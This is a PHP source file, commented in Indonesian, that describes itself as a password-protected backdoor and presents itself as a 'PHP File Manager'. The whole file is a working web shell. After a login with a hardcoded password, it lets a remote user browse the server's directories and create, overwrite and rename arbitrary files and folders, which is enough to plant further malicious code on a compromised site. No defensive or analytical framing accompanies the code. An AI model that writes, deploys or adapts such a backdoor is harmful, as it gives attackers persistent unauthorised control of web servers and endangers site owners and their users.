<?php
// Password untuk mengakses backdoor
$password = 'rahasia123';

// Fungsi untuk membersihkan input
function clean_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Cek password
if (isset($_POST['password']) && clean_input($_POST['password']) === $password) {
    echo '<html><head><title>File Manager</title><style>body{font-family: Arial, sans-serif; background-color: #f0f0f0; color: #333;} .container{width: 80%; margin: 20px auto; background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);} h1{color: #444;} pre{background-color: #eee; padding: 10px; border-radius: 4px; overflow-x: auto;} a{color: #007bff; text-decoration: none;} a:hover{text-decoration: underline;} form{margin-top: 20px;}</style></head><body><div class="container">';
    echo '<h1>PHP File Manager</h1>';

    // Mendapatkan direktori saat ini
    $dir = isset($_GET['dir']) ? clean_input($_GET['dir']) : getcwd();
    chdir($dir);
    echo "<h2>Current Directory: " . htmlspecialchars(getcwd()) . "</h2>";

    // Navigasi ke direktori induk
    echo '<a href="?password=' . htmlspecialchars($password) . '&dir=' . urlencode(dirname($dir)) . '">... (Up)</a><br>';

    // Menampilkan daftar file dan folder
    if ($handle = opendir('.')) {
        echo '<pre>';
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                if (is_dir($entry)) {
                    echo "<a href=\"?password=" . htmlspecialchars($password) . "&dir=" . urlencode(getcwd() . '/' . $entry) . "\">[DIR] " . htmlspecialchars($entry) . "</a><br>";
                } else {
                    echo "[FILE] " . htmlspecialchars($entry) . "<br>";
                }
            }
        }
        closedir($handle);
        echo '</pre>';
    }

    echo '<hr>';

    // --- FITUR-FITUR PENGELOLAAN FILE ---

    // EDIT FILE
    if (isset($_POST['action']) && $_POST['action'] === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
        $file = clean_input($_POST['file']);
        $content = $_POST['content'];
        if (file_put_contents($file, $content) !== false) {
            echo "File '" . htmlspecialchars($file) . "' berhasil diedit.";
        } else {
            echo "Gagal mengedit file '" . htmlspecialchars($file) . "'.";
        }
    }

    // RENAME FILE/FOLDER
    if (isset($_POST['action']) && $_POST['action'] === 'rename' && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $old_name = clean_input($_POST['old_name']);
        $new_name = clean_input($_POST['new_name']);
        if (rename($old_name, $new_name)) {
            echo "Berhasil mengganti nama '" . htmlspecialchars($old_name) . "' menjadi '" . htmlspecialchars($new_name) . "'.";
        } else {
            echo "Gagal mengganti nama '" . htmlspecialchars($old_name) . "'.";
        }
    }

    // BUAT FILE
    if (isset($_POST['action']) && $_POST['action'] === 'create_file' && isset($_POST['filename']) && isset($_POST['file_content'])) {
        $filename = clean_input($_POST['filename']);
        $file_content = $_POST['file_content'];
        if (file_put_contents($filename, $file_content) !== false) {
            echo "File '" . htmlspecialchars($filename) . "' berhasil dibuat.";
        } else {
            echo "Gagal membuat file '" . htmlspecialchars($filename) . "'.";
        }
    }

    // BUAT FOLDER
    if (isset($_POST['action']) && $_POST['action'] === 'create_folder' && isset($_POST['foldername'])) {
        $foldername = clean_input($_POST['foldername']);
        if (mkdir($foldername)) {
            echo "Folder '" . htmlspecialchars($foldername) . "' berhasil dibuat.";
        } else {
            echo "Gagal membuat folder '" . htmlspecialchars($foldername) . "'.";
        }
    }

    // --- FORM UNTUK FITUR DI ATAS ---
    ?>

    <h3>Edit/Buat File</h3>
    <form method="POST">
        <input type="hidden" name="password" value="<?php echo htmlspecialchars($password); ?>">
        <input type="hidden" name="action" value="edit">
        File Name: <input type="text" name="file"><br>
        Content:<br>
        <textarea name="content" rows="10" cols="80"></textarea><br>
        <input type="submit" value="Edit/Create File">
    </form>
    
    <h3>Ganti Nama File/Folder</h3>
    <form method="POST">
        <input type="hidden" name="password" value="<?php echo htmlspecialchars($password); ?>">
        <input type="hidden" name="action" value="rename">
        Old Name: <input type="text" name="old_name"><br>
        New Name: <input type="text" name="new_name"><br>
        <input type="submit" value="Rename">
    </form>

    <h3>Buat Folder</h3>
    <form method="POST">
        <input type="hidden" name="password" value="<?php echo htmlspecialchars($password); ?>">
        <input type="hidden" name="action" value="create_folder">
        Folder Name: <input type="text" name="foldername"><br>
        <input type="submit" value="Create Folder">
    </form>

    <?php
    echo '</div></body></html>';

} else {
    // Tampilan login
    echo '<html><head><title>Login</title><style>body{font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0;} .login-box{background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.1); text-align: center;} input[type="password"]{padding: 10px; width: 200px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;} input[type="submit"]{padding: 10px 20px; border: none; background-color: #007bff; color: white; border-radius: 4px; cursor: pointer;}</style></head><body><div class="login-box"><h1>Login</h1><form method="POST"><input type="password" name="password" placeholder="Password"><br><input type="submit" value="Login"></form></div></body></html>';
}
?>
